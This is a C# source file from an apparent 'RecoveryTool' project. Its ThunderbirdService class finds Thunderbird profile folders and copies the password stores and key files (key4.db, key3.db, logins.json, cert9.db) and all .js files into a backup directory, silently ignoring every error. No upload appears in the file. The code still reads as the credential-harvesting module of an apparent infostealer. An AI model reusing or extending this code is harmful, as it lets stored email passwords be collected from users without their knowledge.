using RecoveryTool.Recovery.Utilities;
using System.Text.RegularExpressions;

namespace RecoveryTool.Recovery.EmailClients
{
    public static partial class ThunderbirdService
    {
        private static readonly string ThunderbirdFolder = Path.Combine(Common.AppData, "Thunderbird", "Profiles");
        private static readonly string[] FilePatterns = ["key4.db", "key3.db", "logins.json", "cert9.db", "*.js"];

        public static async Task SaveThunderbirdAsync()
        {
            if (!Directory.Exists(ThunderbirdFolder))
            {
                return;
            }

            string thunderbirdBackup = Common.EnsureThunderbirdPath();
            var regex = Pattern();

            await Task.Run(() =>
            {
                var directories = Directory.GetDirectories(ThunderbirdFolder)
                    .Where(d => regex.IsMatch(Path.GetFileName(d)));

                foreach (var directory in directories)
                {
                    CopyFiles(directory, thunderbirdBackup);
                }
            });
        }

        private static void CopyFiles(string sourceDirectory, string backupRoot)
        {
            string destinationPath = Path.Combine(backupRoot, Path.GetFileName(sourceDirectory));

            foreach (var filePattern in FilePatterns)
            {
                try
                {
                    var files = Directory.EnumerateFiles(sourceDirectory, filePattern, SearchOption.AllDirectories);

                    foreach (var file in files)
                    {
                        string relativePath = Path.GetRelativePath(sourceDirectory, file);
                        string destFilePath = Path.Combine(destinationPath, relativePath);

                        Directory.CreateDirectory(Path.GetDirectoryName(destFilePath));
                        File.Copy(file, destFilePath, true);
                    }
                } catch { }
            }
        }

        [GeneratedRegex(@"^[a-z0-9]+\.default-esr$", RegexOptions.Compiled)]
        private static partial Regex Pattern();
    }
}